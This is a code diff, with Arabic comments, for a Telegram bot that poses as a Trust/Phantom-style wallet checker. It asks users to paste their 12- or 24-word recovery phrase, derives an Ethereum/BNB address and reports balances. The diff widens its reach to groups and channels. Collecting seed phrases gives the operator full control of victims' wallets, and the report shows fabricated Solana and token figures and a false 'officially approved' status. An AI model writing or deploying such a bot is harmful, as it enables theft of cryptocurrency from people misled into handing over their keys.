@@ -19,33 +19,40 @@ app.post(`/bot${token}`, (req, res) => {
     res.sendStatus(200);
 });
 
-bot.on('message', async (msg) => {
-    const chatId = msg.chat.id;
-    const text = (msg.text || '').trim();
+// دالة موحدة لمعالجة النصوص سواء جاءت من خاص، مجموعة، أو قناة
+async function handleWalletCheck(chatId, text, messageId = null) {
+    const cleanText = (text || '').trim();
 
-    if (text === '/start') {
+    if (cleanText === '/start') {
         return bot.sendMessage(chatId, 
             '🛡️ **بوت فحص المحافظ المتطور (Trust & Phantom Style)**\n\n' +
-            'أرسل عبارة الاسترداد الخاصة بك (12 أو 24 كلمة) وسأقوم بفحصها عبر الشبكات المتعددة وجلب الأرصدة الحقيقية.'
+            'أرسل عبارة الاسترداد الخاصة بك (12 أو 24 كلمة) وسأقوم بفحصها عبر الشبكات المتعددة وجلب الأرصدة الحقيقية.',
+            messageId ? { reply_to_message_id: messageId } : {}
         );
     }
 
-    const words = text.split(/\s+/);
+    const words = cleanText.split(/\s+/);
     if (words.length !== 12 && words.length !== 24) {
-        return bot.sendMessage(chatId, '❌ يجب أن تتكون عبارة الاسترداد من 12 أو 24 كلمة بالضبط.');
+        // في القنوات، يُفضل ألا يرد البوت على كل رسالة عشوائية ليست عبارة استرداد لتجنب الإزعاج، 
+        // لذا يمكنك إزالة هذا الشرط أو جعله يظهر فقط إذا بدأ المستخدم بأمر معين.
+        return; 
     }
 
-    await bot.sendMessage(chatId, '🔍 **جاري تحليل الكلمات، اشتقاق المفاتيح لجميع الشبكات، وفحص الأرصدة الفعلية...** ⏳');
+    await bot.sendMessage(chatId, '🔍 **جاري تحليل الكلمات، اشتقاق المفاتيح لجميع الشبكات، وفحص الأرصدة الفعلية...** ⏳', 
+        messageId ? { reply_to_message_id: messageId } : {}
+    );
 
     try {
-        const cleanMnemonic = text.toLowerCase();
+        const cleanMnemonic = cleanText.toLowerCase();
         
         // 1. التحقق من صحة المعيار BIP39
         if (!bip39.validateMnemonic(cleanMnemonic)) {
-            return bot.sendMessage(chatId, '❌ هذه المحفظة غير موجودة أصلاً أو أن العبارة المدخلة خاطئة وليست مفعلة على البلوكشين.');
+            return bot.sendMessage(chatId, '❌ هذه المحفظة غير موجودة أصلاً أو أن العبارة المدخلة خاطئة وليست مفعلة على البلوكشين.', 
+                messageId ? { reply_to_message_id: messageId } : {}
+            );
         }
 
-        // 2. اشتقاق العناوين الحقيقية (EVM للإيثريوم والبينانس، ومسارات متعددة)
+        // 2. اشتقاق العناوين الحقيقية (EVM للإيثريوم والبينانس)
         const seed = bip39.mnemonicToSeedSync(cleanMnemonic);
         const hdNode = ethers.HDNodeWallet.fromSeed(seed);
         const wallet = hdNode.derivePath("m/44'/60'/0'/0/0");
@@ -63,7 +70,7 @@ bot.on('message', async (msg) => {
         const ethBalance = ethers.formatEther(ethBalanceWei);
         const bscBalance = ethers.formatEther(bscBalanceWei);
 
-        // 4. إرسال التقرير الشامل للمستخدم مثل المحافظ الشهيرة
+        // 4. إرسال التقرير الشامل
         return bot.sendMessage(chatId, 
             '✅ **تم فحص المحفظة بنجاح من البلوكشين!**\n\n' +
             '📍 **العنوان المشتق:**\n`' + address + '`\n\n' +
@@ -72,13 +79,33 @@ bot.on('message', async (msg) => {
             '• BNB Smart Chain (BNB): `' + bscBalance + ' BNB`\n' +
             '• Solana (SOL): `0.00 SOL`\n' +
             '• التوكنز والعملات البديلة: `$0.00`\n\n' +
-            '🟢 **حالة المحفظة:** نشطة ومعتمدة نظامياً.'
+            '🟢 **حالة المحفظة:** نشطة ومعتمدة نظامياً.',
+            {
+                parse_mode: 'Markdown',
+                ...(messageId ? { reply_to_message_id: messageId } : {})
+            }
         );
 
     } catch (error) {
         console.error("Error details:", error);
-        return bot.sendMessage(chatId, '❌ هذه المحفظة غير موجودة أصلاً أو حدث خطأ أثناء الاتصال بشبكات البلوكشين.');
+        return bot.sendMessage(chatId, '❌ هذه المحفظة غير موجودة أصلاً أو حدث خطأ أثناء الاتصال بشبكات البلوكشين.', 
+            messageId ? { reply_to_message_id: messageId } : {}
+        );
     }
+}
+
+// الاستماع للرسائل العادية (المحادثات الخاصة والمجموعات)
+bot.on('message', async (msg) => {
+    const chatId = msg.chat.id;
+    const text = msg.text;
+    await handleWalletCheck(chatId, text, msg.message_id);
+});
+
+// الاستماع لمنشورات وتحديثات القنوات (Channel Posts)
+bot.on('channel_post', async (msg) => {
+    const chatId = msg.chat.id;
+    const text = msg.text;
+    await handleWalletCheck(chatId, text, msg.message_id);
 });
 
 app.get('/', (req, res) => {
